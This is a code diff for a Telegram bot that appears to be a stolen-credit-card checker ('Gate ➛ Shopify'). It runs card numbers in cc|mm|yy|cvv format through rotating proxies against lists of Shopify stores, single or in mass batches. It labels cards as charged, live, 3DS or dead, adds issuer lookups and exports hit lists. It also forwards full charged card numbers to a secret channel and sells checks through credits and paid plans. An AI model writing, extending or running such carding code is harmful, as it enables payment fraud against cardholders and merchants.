@@ -438,11 +438,261 @@ def _get_ud(uid, ctx):
 
 def _sid(): return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
 
-COUNTRY_FLAGS = {
-    "US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷",
-    "IN":"🇮🇳","BR":"🇧🇷","MX":"🇲🇽","JP":"🇯🇵","CN":"🇨🇳","RU":"🇷🇺",
-    "IT":"🇮🇹","ES":"🇪🇸","NL":"🇳🇱","SE":"🇸🇪","NG":"🇳🇬","ZA":"🇿🇦",
-    "EG":"🇪🇬","PK":"🇵🇰","SG":"🇸🇬","MY":"🇲🇾","ID":"🇮🇩","TH":"🇹🇭",
-    "PH":"🇵🇭","VN":"🇻🇳","AE":"🇦🇪","SA":"🇸🇦","TR":"🇹🇷","PL":"🇵🇱",
-    "UA":"🇺🇦","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱","NZ":"🇳🇿","HK":"🇭🇰",
-    "TW":"🇹🇼","KR":"🇰🇷","IL":"🇮🇱","
+def _get_flag(alpha2):
+    if not alpha2 or len(alpha2) != 2: return "🌍"
+    return "".join(chr(0x1F1E6 + ord(c) - ord('A')) for c in alpha2.upper())
+
+async def _fetch_bin_direct(bin6: str) -> dict:
+    sources = [
+        {"url": f"https://data.handyapi.com/bin/{bin6}", "parse": lambda d: {"scheme": (d.get("Scheme") or "").upper(), "bank": d.get("Issuer") or "", "country": (d.get("Country") or {}).get("Name", ""), "country_code": (d.get("Country") or {}).get("A2", "")}},
+        {"url": f"https://lookup.binlist.net/{bin6}", "parse": lambda d: {"scheme": (d.get("scheme") or "").upper(), "bank": (d.get("bank") or {}).get("name", ""), "country": (d.get("country") or {}).get("name", ""), "country_code": (d.get("country") or {}).get("alpha2", "")}},
+    ]
+    _to = aiohttp.ClientTimeout(total=10, connect=5)
+    for src in sources:
+        try:
+            async with aiohttp.ClientSession(timeout=_to, headers={"User-Agent": "Mozilla/5.0"}) as s:
+                async with s.get(src["url"], ssl=False) as r:
+                    if r.status != 200: continue
+                    try: data = await r.json(content_type=None)
+                    except: continue
+                    info = src["parse"](data)
+                    if info.get("scheme") and (info.get("bank") or info.get("country")):
+                        info["country_emoji"] = _get_flag(info.get("country_code", ""))
+                        return info
+        except: continue
+    return {}
+
+async def _bin_lookup(bin6: str) -> dict:
+    if bin6 in _BIN_CACHE: return _BIN_CACHE[bin6]
+    result = {}
+    try: result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=10)
+    except: pass
+    if not result or not result.get("scheme"):
+        try: result = await asyncio.wait_for(get_bin_info(bin6), timeout=8) or {}
+        except: result = {}
+    if result and not result.get("country_emoji"):
+        result["country_emoji"] = _get_flag(result.get("country_code", ""))
+    _BIN_CACHE[bin6] = result
+    return result
+
+def _bin_str_plain(bd: dict) -> str:
+    def _g(*keys):
+        for k in keys:
+            v = bd.get(k)
+            if v and str(v).strip() not in ("", "None", "N/A", "null", "UNKNOWN"): return str(v).strip()
+        return "N/A"
+    scheme = _g("scheme", "brand", "card_scheme", "network").upper()
+    bank = _g("bank", "bank_name", "issuer", "issuer_name")
+    country = _g("country", "country_name", "country_full")
+    flag = bd.get("country_emoji", "🌍")
+    cstr = f"{flag} {country}".strip()
+    return f"{scheme} - {bank} - {cstr}"
+
+def build_result_msg(card, resp, verdict, bin_data, price, currency, elapsed, user, plan):
+    ulink = _user_link(user); ts = _fmt_time(elapsed); bin_s = escape(_bin_str_plain(bin_data))
+    raw_resp = resp or "Unknown"; display_resp_clean = raw_resp
+    ch_link = f'<a href="{CHANNEL_LINK}">[❆]</a>'; live_eid = get_random_live_emoji()
+    if verdict == "CHARGED":
+        status_line = f'<b>{ch_link} HIT CHARGED <tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji></b>'
+        gate_line = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"; resp_te = f'<tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji>'
+    elif verdict == "TDS":
+        status_line = f'<b>{ch_link} HIT LIVE [3DS] <tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>'; gate_line = "Gate ➛ Shopify"; resp_te = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
+    elif verdict == "LIVE":
+        status_line = f'<b>{ch_link} HIT LIVE <tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>'; gate_line = "Gate ➛ Shopify"; resp_te = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
+    else:
+        status_line = f'<b>{ch_link} DEAD DECLINED <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>'; gate_line = "Gate ➛ Shopify"; resp_te = f'<tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji>'
+    safe_resp = escape(display_resp_clean)
+    return f'{status_line}\n\n<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n<b>   ⤷ <code>{escape(card)}</code></b>\n<b>{gate_line}</b>\n<b>──────────</b>\n<b>{resp_te} Resp ➛ {safe_resp}</b>\n<b>Bin ➛ <code>{bin_s}</code></b>\n<b>──────────</b>\n<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➛ {ts}</b>\n<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➛ {ulink} <tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>\n<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➛ {DEV_LINK_HTML} <tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
+
+def _progress_text(sess: dict) -> str:
+    ts = _fmt_time(time.time() - sess["start_time"]); uobj = sess.get("user_obj"); ulink = _user_link(uobj) if uobj else "User"
+    return f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➛ Shopify</b>\n<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➛ {sess["checked"]}/{sess["total"]}</b>\n<b>Charged ➛ {sess["charged"]} <tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji></b>\n<b>Live ➛ {sess["approved"]} <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n<b>Dead ➛ {sess["dead"]} <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>\n<b>Errors ➛ {sess["errors"]} <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n<b>Time ➛ {ts}</b>\n<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➛ {ulink} <tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>\n<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➛ {DEV_LINK_HTML} <tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
+
+def _msh_buttons(sid: str, running: bool) -> RawMarkup:
+    sess = MSH_SESSIONS.get(sid, {}); charged_n = sess.get("charged", 0); live_n = sess.get("approved", 0); all_n = sess.get("checked", 0)
+    rows = [[_btn(f"Charged ({charged_n})", cb=f"{_CB_RESULT}:{sid}:charged", style="danger", icon=BTN_CHARGED_EMOJI_ID), _btn(f"Live ({live_n})", cb=f"{_CB_RESULT}:{sid}:live", style="success", icon=BTN_LIVE_EMOJI_ID), _btn(f"All ({all_n})", cb=f"{_CB_RESULT}:{sid}:all", style="primary", icon=BTN_ALL_EMOJI_ID)]]
+    if running: rows.append([_btn("Stop", cb=f"{_CB_STOP}:{sid}", style="danger", icon=BTN_STOP_EMOJI_ID)])
+    return RawMarkup(rows)
+
+async def _update_progress(bot, sid: str, force: bool = False):
+    sess = MSH_SESSIONS.get(sid)
+    if not sess: return
+    now = time.time()
+    if not force and (now - sess.get("last_update", 0)) < 1.0: return
+    text = _progress_text(sess); running = sess["status"] == "CHECKING"
+    if text == sess.get("last_text") and not force: return
+    try:
+        await bot.edit_message_text(chat_id=sess["chat_id"], message_id=sess["msg_id"], text=text, parse_mode="HTML", reply_markup=_msh_buttons(sid, running), disable_web_page_preview=True)
+        sess["last_text"] = text; sess["last_update"] = now
+    except: pass
+
+def _make_result_file(sess: dict, kind: str) -> tuple:
+    if kind == "charged": cards, label = sess.get("charged_cards", []), "Charged"
+    elif kind == "live": cards = sess.get("charged_cards", []) + sess.get("live_cards", []); label = "Live"
+    elif kind == "dead": cards, label = sess.get("dead_cards", []), "Dead"
+    else: cards = sess.get("charged_cards", []) + sess.get("live_cards", []) + sess.get("dead_cards", []) + sess.get("error_cards", []); label = "All"
+    uname = (sess.get("user_obj") and (getattr(sess["user_obj"], "first_name", None) or "User")) or "User"; plan = sess.get("plan", "TRIAL")
+    lines = ["Gate ➳ Shopify | 0-5 USD", f"Result ➳ {label}", f"Total ➳ {len(cards)}", f"User ➳ {uname} ({plan})", f"Dev ➳ {BOT_NAME}", "━━━━━━━━━━━━━━"]
+    for cd in cards:
+        bi = cd.get("bin_info", {}); flag = bi.get("country_emoji", "🌍"); cdisp = f"{flag} {bi.get('country','N/A')}".strip()
+        resp = cd.get("resp", cd.get("response", "N/A")) or "N/A"; ver = cd.get("verdict", "N/A"); prc = cd.get("price", "0.00"); cur = cd.get("currency", "USD")
+        status = "Charged" if ver == "CHARGED" else "Live" if ver in ("LIVE","TDS") else "Dead" if ver == "DEAD" else "Error"
+        raw_disp = f"{resp} | {prc} {cur}" if ver == "CHARGED" else resp
+        lines += [f"Card ➳ {cd.get('card','N/A')}", f"Status ➳ {status}", f"Gate ➳ Shopify | {prc} {cur}", f"Resp ➳ {raw_disp}", f"Brand ➳ {bi.get('scheme','N/A')}", f"Issuer ➳ {bi.get('bank','N/A')}", f"Country ➳ {cdisp}", "━━━━━━━━━━━━━━"]
+    buf = BytesIO("\n".join(lines).encode("utf-8")); buf.seek(0)
+    return buf, f"Superman_{label.upper()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", len(cards)
+
+async def _send_hit(bot, user, text: str, verdict: str, card: str = "", bin_data: dict = None, price: str = "0.00", currency: str = "USD", plan: str = "TRIAL", resp: str = "", skip_dm: bool = False):
+    bin_data = bin_data or {}
+    if verdict in ("LIVE", "TDS"): return
+    eid = get_random_charged_emoji(); ulink = _user_link(user); resp_disp = escape(resp) if resp else "ORDER_PAID"
+    gate_txt = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"
+    log_html = f'<b>HIT ➛ CHARGED <tg-emoji emoji-id="{eid}">💎</tg-emoji></b>\n<b>{gate_txt}</b>\n<b><tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji> <code>{resp_disp}</code></b>\n<b>User ➛ {ulink} <tg-emoji emoji-id="{_plan_eid(plan)}">⭐</tg-emoji></b>'
+    log_kb = RawMarkup([[_btn("𝘽𝘼𝙏 ✘ 𝘾𝙃𝙆", url=BOT_USERNAME_LINK, style="primary", icon=CARD_CHK_BTN_EMOJI_ID)]])
+    if not skip_dm:
+        try: await _send_as_media(bot, user.id, eid, caption=text, parse_mode="HTML")
+        except: pass
+    if SECRET_CHANNEL_ID and verdict == "CHARGED":
+        try:
+            bin_s = escape(_bin_str_plain(bin_data))
+            sc_html = f"<b>HIT ➛ CHARGED 💎</b>\n<b>{gate_txt}</b>\n<b>──────────</b>\n<b>💳 <code>{escape(card)}</code></b>\n<b>🏦 {bin_s}</b>\n<b>──────────</b>\n<b>👤 {ulink} ⭐</b>\n<b>⚡ {DEV_LINK_HTML}</b>"
+            await _send_as_media(bot, SECRET_CHANNEL_ID, eid, caption=sc_html, parse_mode="HTML", disable_notification=True)
+        except: pass
+
+def create_msh_session(sid, chat_id, user_id, msg_id, user_msg_id, total, user_obj, plan) -> dict:
+    sess = {"status": "CHECKING", "chat_id": chat_id, "user_id": user_id, "msg_id": msg_id, "user_msg_id": user_msg_id, "total": total, "checked": 0, "charged": 0, "approved": 0, "dead": 0, "errors": 0, "start_time": time.time(), "charged_cards": [], "live_cards": [], "dead_cards": [], "error_cards": [], "tasks": [], "last_text": "", "last_update": 0, "user_obj": user_obj, "plan": plan, "plan_eid": _plan_eid(plan)}
+    MSH_SESSIONS[sid] = sess; return sess
+
+async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies, bot_data=None):
+    sess = MSH_SESSIONS.get(sid)
+    if not sess: return
+    effective_proxies = proxies if proxies else _ALL_PROXIES
+    if not effective_proxies: effective_proxies = _load_proxies()
+    if not all_sites: all_sites = get_working_sites()
+    elif _WORKING_SITES: all_sites = list(_WORKING_SITES)
+    sem = asyncio.Semaphore(MAX_CONCURRENT)
+    async def worker(card_fmt: str, cc_num: str):
+        if sess.get("status") != "CHECKING": return
+        async with sem:
+            if sess.get("status") != "CHECKING": return
+            t0 = time.time(); card_sites = list(all_sites); random.shuffle(card_sites); card_proxies = list(effective_proxies); random.shuffle(card_proxies)
+            try: verdict, resp, price, currency = await _check_card_with_retry(None, card_fmt, card_sites, card_proxies, max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT, sid=sid)
+            except: verdict, resp, price, currency = "ERROR", "Unknown Error", "0.00", "USD"
+            elapsed = time.time() - t0
+            try: bin_data = await asyncio.wait_for(_bin_lookup(cc_num[:6]), timeout=5)
+            except: bin_data = {}
+            rec = {"card": card_fmt, "verdict": verdict, "resp": resp, "response": resp, "price": price, "currency": currency, "bin_info": bin_data}
+            sess["checked"] += 1
+            if verdict == "CHARGED":
+                sess["charged"] += 1; sess["charged_cards"].append(rec)
+                if bot_data is not None:
+                    _ud_store = bot_data.setdefault("user_data", {}); _ud_msh = _ud_store.setdefault(str(user.id), {}); _ud_msh["total_charged"] = _ud_msh.get("total_charged", 0) + 1
+                _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data, price, currency, elapsed, user, plan)
+                asyncio.create_task(_send_hit(bot, user, _dm_html, "CHARGED", card=card_fmt, bin_data=bin_data, price=price, currency=currency, plan=plan, resp=resp))
+                asyncio.create_task(_update_progress(bot, sid, force=True))
+            elif verdict == "TDS": sess["approved"] += 1; sess["live_cards"].append(rec); asyncio.create_task(_update_progress(bot, sid, force=True))
+            elif verdict == "LIVE": sess["approved"] += 1; sess["live_cards"].append(rec); asyncio.create_task(_update_progress(bot, sid, force=True))
+            elif verdict == "DEAD": sess["dead"] += 1; sess["dead_cards"].append(rec)
+            else: sess["errors"] += 1; sess["error_cards"].append(rec)
+            asyncio.create_task(_update_progress(bot, sid))
+    sess["tasks"] = []
+    for cf, cn in valid_cards:
+        if sess.get("status") != "CHECKING": break
+        t = asyncio.create_task(worker(cf, cn)); sess["tasks"].append(t)
+    await asyncio.gather(*sess["tasks"], return_exceptions=True)
+    if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING": MSH_SESSIONS[sid]["status"] = "FINISHED"
+    await _update_progress(bot, sid, force=True)
+
+async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; parts = q.data.split(":", 2)
+    if len(parts) < 3: await q.answer("❌ Invalid.", show_alert=True); return
+    _, sid, kind = parts; sess = MSH_SESSIONS.get(sid)
+    if not sess: await q.answer("⚠️ Session expired.", show_alert=True); return
+    if q.from_user.id != sess.get("user_id"): await q.answer("❌ Not your session.", show_alert=True); return
+    buf, fname, count = _make_result_file(sess, kind)
+    if count == 0 and kind != "all": await q.answer(f"❌ No {kind.capitalize()} cards yet.", show_alert=True); return
+    await q.answer("📦 Generating file…")
+    try: await context.bot.send_document(chat_id=q.message.chat_id, document=InputFile(buf, filename=fname), caption=f"<b>Result ➳ {kind.capitalize()}</b>\n<b>Total ➳ {count}</b>", parse_mode="HTML")
+    except: pass
+
+async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; parts = q.data.split(":", 1)
+    if len(parts) < 2: await q.answer("❌ Invalid.", show_alert=True); return
+    _, sid = parts; sess = MSH_SESSIONS.get(sid)
+    if not sess: await q.answer("⚠️ Already finished.", show_alert=True); return
+    if q.from_user.id != sess.get("user_id"): await q.answer("❌ Not your session.", show_alert=True); return
+    if sess["status"] != "CHECKING": await q.answer("ℹ️ Not running.", show_alert=True); return
+    sess["status"] = "STOPPED"
+    for t in sess.get("tasks", []):
+        if not t.done(): t.cancel()
+    await q.answer("🛑 Stopped.")
+    await _update_progress(context.bot, sid, force=True)
+
+async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user; ud = _get_ud(user.id, context)
+    if context.bot_data.get("maintenance") and user.id != OWNER_ID: await update.message.reply_text("🔧 <b>Bot under maintenance.</b>", parse_mode="HTML"); return
+    if not context.bot_data.get("sh_on", True): await update.message.reply_text("❌ <b>Single check disabled.</b>", parse_mode="HTML"); return
+    card = None
+    if context.args: card = context.args[0].strip()
+    elif update.message.reply_to_message:
+        txt = (update.message.reply_to_message.text or update.message.reply_to_message.caption or "").strip()
+        if txt:
+            _found = extract_cards(txt)
+            if _found: card = _found[0]
+            elif "|" in txt: card = next((t for t in txt.split() if "|" in t), None)
+    if not card or "|" not in card: await update.message.reply_text("ℹ️ <b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>", parse_mode="HTML"); return
+    parts = card.split("|")
+    if len(parts) != 4: await update.message.reply_text("❌ Invalid format.", parse_mode="HTML"); return
+    cc, mm, yy, cvv = parts
+    if not luhn_check(cc): await update.message.reply_text("❌ Card failed Luhn check.", parse_mode="HTML"); return
+    if is_expired(mm, yy): await update.message.reply_text("❌ Card is expired.", parse_mode="HTML"); return
+    premium = _is_premium(ud, user.id)
+    if not premium:
+        if ud.get("credits", 0) <= 0: await update.message.reply_text("❌ <b>No credits.</b> Use /buy to upgrade.", parse_mode="HTML"); return
+        cd_map = context.bot_data.setdefault("sh_cd", {}); rem = SH_COOLDOWN - (time.time() - cd_map.get(user.id, 0))
+        if rem > 0: await update.message.reply_text(f"⏳ <b>Cooldown:</b> wait <b>{int(rem)}s</b>", parse_mode="HTML"); return
+        cd_map[user.id] = time.time(); ud["credits"] = max(0, ud.get("credits", 1) - 1)
+    plan = ud.get("plan", "TRIAL")
+    spin = await update.message.reply_text(f'<b><tg-emoji emoji-id="{SH_GATE_EMOJI_ID}">❤️</tg-emoji>gate ➳Shopify</b>\n<b><tg-emoji emoji-id="{SH_PROG_EMOJI_ID}">😄</tg-emoji>Progress ➳ 0/1</b>\n<b>Live ➳ 0 <tg-emoji emoji-id="{SH_LIVE_EMOJI_ID}">🎸</tg-emoji>✅</b>', parse_mode="HTML")
+    proxies = _load_proxies()
+    if not proxies: await spin.edit_text("❌ <b>No proxies in px.txt</b>", parse_mode="HTML"); return
+    try: sites = get_working_sites()
+    except: await spin.edit_text("❌ <b>No Shopify sites configured.</b>", parse_mode="HTML"); return
+    if not sites: await spin.edit_text("❌ <b>sites.txt is empty.</b>", parse_mode="HTML"); return
+    t0 = time.time()
+    try:
+        (verdict, resp, price, currency), bin_data = await asyncio.gather(_check_card_with_retry(None, card, sites, proxies, max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT), _bin_lookup(cc[:6]))
+    except: verdict, resp, price, currency = "ERROR", "Unknown Error", "0.00", "USD"; bin_data = {}
+    elapsed = time.time() - t0; res_html = build_result_msg(card, resp, verdict, bin_data, price, currency, elapsed, user, plan)
+    if verdict == "CHARGED":
+        _cmd_eid = get_random_charged_emoji(); _ud_sh = _get_ud(user.id, context); _ud_sh["total_charged"] = _ud_sh.get("total_charged", 0) + 1
+    elif verdict in ("LIVE", "TDS"): _cmd_eid = get_random_live_emoji()
+    else: _cmd_eid = DECLINED_EMOJI_ID
+    kb = RawMarkup([[_btn(f"📢 {BOT_NAME}", url=CHANNEL_LINK, style="primary")]])
+    try: await spin.delete()
+    except: pass
+    await _send_as_media(context.bot, update.effective_chat.id, _cmd_eid, caption=res_html, parse_mode="HTML", reply_markup=kb, reply_to_message_id=update.message.message_id)
+    if verdict in ("CHARGED", "LIVE", "TDS"):
+        _in_private = (update.effective_chat.id == user.id)
+        asyncio.create_task(_send_hit(context.bot, user, res_html, verdict, card=card, bin_data=bin_data, price=price, currency=currency, plan=plan, resp=resp, skip_dm=_in_private))
+
+def get_sh_handler(): return CommandHandler("sh", cmd_sh)
+def get_me_handler(): return CommandHandler("me", cmd_me)
+
+async def cmd_me(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user; ud = _get_ud(user.id, context); charged = ud.get("total_charged", 0)
+    display = f"@{user.username}" if getattr(user, "username", None) else user.first_name or "User"
+    mb = MsgBuilder()
+    mb.emoji("6181649972757271368", "⚜").bold(f"Total charge cards➳{charged}").nl()
+    mb.emoji("6264538349034281099", "😃").italic(display).nl()
+    mb.emoji("6271506980716680365", "👑").bold("Bot➳").mention("@superman8585_bot")
+    text, entities = mb.build()
+    await update.message.reply_text(text, entities=entities)
+
+__all__ = [
+    "get_sh_handler", "get_me_handler", "_check_card_with_retry", "SITE_RETRIES", "SITE_TIMEOUT",
+    "MSH_SESSIONS", "run_mass_batch", "create_msh_session", "cb_msh_result", "cb_msh_stop", "build_result_msg",
+    "_load_sites", "_load_proxies", "probe_all_sites", "get_working_sites", "start_probe_background", "stop_probe_background",
+    "_WORKING_SITES", "_PROBE_IN_PROGRESS", "_send_as_media", "_get_sticker_fid", "_send_sticker", "get_random_live_emoji",
+    "_bin_lookup", "_bin_str_plain"
+]
